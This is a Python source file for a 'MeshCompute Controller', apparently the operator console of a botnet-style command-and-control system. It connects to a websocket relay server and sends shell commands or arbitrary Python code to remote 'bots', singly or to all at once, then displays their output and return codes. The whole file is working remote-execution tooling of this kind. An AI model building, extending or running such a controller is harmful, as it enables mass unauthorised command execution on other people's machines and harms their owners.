import asyncio
import websockets
import json
import time
import os
from colorama import init, Fore, Style

init(autoreset=True)

VPS_URL = "ws://YOUR_SERVER_URL:8765"

async def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

async def format_result(bot_id: str, result):
    print(f"\n{Fore.YELLOW}📤 [{bot_id}]{Style.RESET_ALL}")
    if isinstance(result, dict):
        if "stdout" in result and result["stdout"]:
            print(result["stdout"].strip())
        if "stderr" in result and result["stderr"]:
            print(f"{Fore.RED}{result['stderr'].strip()}{Style.RESET_ALL}")
        if "returncode" in result:
            print(f"{Fore.CYAN}Return: {result['returncode']}{Style.RESET_ALL}")
        elif "error" in result:
            print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
    else:
        print(result)
    print("-" * 60)


async def controller():
    while True:
        try:
            async with websockets.connect(VPS_URL) as ws:
                await ws.send(json.dumps({"type": "controller"}))
                print(f"{Fore.GREEN}Connected with server{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}=== MeshCompute Controller ==={Style.RESET_ALL}\n")

                async def console_input():
                    while True:
                        try:
                            cmd_line = await asyncio.get_event_loop().run_in_executor(
                                None, input, f"{Fore.WHITE}mesh> {Style.RESET_ALL}"
                            )
                            cmd_line = cmd_line.strip()
                            if not cmd_line:
                                continue

                            if cmd_line.lower() == "clear":
                                await clear_screen()
                                print(f"{Fore.MAGENTA}=== MeshCompute Controller ==={Style.RESET_ALL}\n")
                                continue

                            if cmd_line.lower() == "help":
                                print("\navailable commands:")
                                print("  list")
                                print("  ping <id|all>")
                                print("  system_info <id|all>")
                                print("  shell <id|all> <befehl>")
                                print("  python <id|all> <code>")
                                print("  clear")
                                print("  exit")
                                continue

                            # Befehl parsen
                            parts = cmd_line.split(maxsplit=2)
                            action = parts[0].lower()

                            msg = {
                                "type": "command",
                                "target": parts[1] if len(parts) > 1 else "all",
                                "action": action,
                                "payload": parts[2] if len(parts) > 2 else None,
                                "task_id": str(int(time.time() * 1000))[-8:]
                            }

                            await ws.send(json.dumps(msg))

                            if action != "list":
                                print(f"{Fore.CYAN}→ {action} sent to {msg['target']}{Style.RESET_ALL}")

                        except Exception as e:
                            print(f"Input error: {e}")

                async def receive_results():
                    try:
                        async for message in ws:
                            data = json.loads(message)
                            if data["type"] == "result":
                                bot_id = data.get("bot_id", "Unknown")
                                result = data.get("data")
                                await format_result(bot_id, result)
                    except:
                        pass

                await asyncio.gather(console_input(), receive_results())

        except Exception as e:
            print(f"{Fore.RED}Connection lost: {e}{Style.RESET_ALL}")
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(controller())